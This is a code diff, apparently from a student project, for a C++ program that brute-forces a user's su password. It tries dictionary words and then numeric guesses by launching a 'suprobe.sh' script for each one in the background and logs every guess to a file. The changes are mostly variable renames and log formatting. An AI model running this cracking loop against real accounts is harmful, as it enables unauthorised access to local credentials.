@@ -97,13 +97,13 @@ int main(int argc, char **argv){
         return(1);
     }
     string pwd;
-    int index = 1;
+    int num = 1;
     while (pwd_file >> pwd) {
-	HT[pwd] = index;        //use HT[pwd] to get index
+	HT[pwd] = num;        //use HT[pwd] to get index
         pwds.push_back(pwd);  //use pwds[index] to get pwd
-        index++;
+        num++;
     }
-    int DICT_SIZE = index;
+    int DICT_SIZE = num;
 
     //PASSWORD ANALYSIS MODE:
         //If password is in dictionary, do math to tell user how long it would take 
@@ -123,14 +123,15 @@ int main(int argc, char **argv){
     }
 
 	//Mayank's Graduate Functionality:
-	HashTable HT;
-	if (HT.isEmpty()) {
-		cout << "Empty Hash!" << endl;
+	HashTable hash;
+	if (hash.isEmpty()) {
+		cout << "Start: Empty Hash!" << endl;
 	} else {
 		cout << "Not Empty!" << endl;
 	}
-    int num = 0;
+    int numOfPasswords = 0;
     ofstream myfile ("Tried_Passwords.txt");
+
     //PASSWORD CRACKING MODE:
     system("rm su.txt; install -m 666 /dev/null su.txt"); //writeable file for storing password
     for(int i = 0; i <= DICT_SIZE; i++){ //Keeps procs from trying the same words
@@ -141,14 +142,14 @@ int main(int argc, char **argv){
         }
 
         // Storing each password tried in hash table and printing it to Tried_Passwords.txt
-        HT.insertItem(num, pwds[i]);
+        hash.insertItem(numOfPasswords, pwds[i]);
         if (myfile.is_open()) {
-            myfile << num << pwds[i];
+            myfile << numOfPasswords << ": " << pwds[i] << "\n";
         }
 
-        const string cmd = "bash suprobe.sh " + pwds[i] + ' ' + USERNAME + ' ' + to_string(getpid()) + ' ' + to_string(num) + ">/dev/null 2>/dev/null &";
+        const string cmd = "bash suprobe.sh " + pwds[i] + ' ' + USERNAME + ' ' + to_string(getpid()) + ' ' + to_string(numOfPasswords) +' ' + ">/dev/null 2>/dev/null &";
         system(cmd.c_str());
-        num++;
+        numOfPasswords++;
     }
     //If we make it this far, password was not in dict;
     for(long long i = 0; i < 10000000000; i++){ //If we try long enough, give up. To speed up the process to get to "1234", start i at 964900
@@ -157,14 +158,14 @@ int main(int argc, char **argv){
 
         // Storing each password tried in hash table and printing it to Tried_Passwords.txt
         // Here it will add after the passwords from passwords.txt executed
-        HT.insertItem(num, pwd);
+        hash.insertItem(numOfPasswords, pwd);
         if (myfile.is_open()) {
-            myfile << num << pwd;
+            myfile << numOfPasswords << ": " << pwd << "\n";
         }
 
-        const string cmd = "bash suprobe.sh " + pwd + ' ' + USERNAME + ' ' + to_string(getpid()) + ' ' + to_string(num) + ">/dev/null 2>/dev/null &";
+        const string cmd = "bash suprobe.sh " + pwd + ' ' + USERNAME + ' ' + to_string(getpid()) + ' ' + to_string(numOfPasswords) + ' ' + ">/dev/null 2>/dev/null &";
         system(cmd.c_str());
-        num++;
+        numOfPasswords++;
         if(i%100==0 && found()) passwordFound(0); //If found, abort
         //Attempt to keep procs under PROC_CAP
         while(i%3==0 && stoi(exec("ps -e | wc -l")) > PROC_CAP){
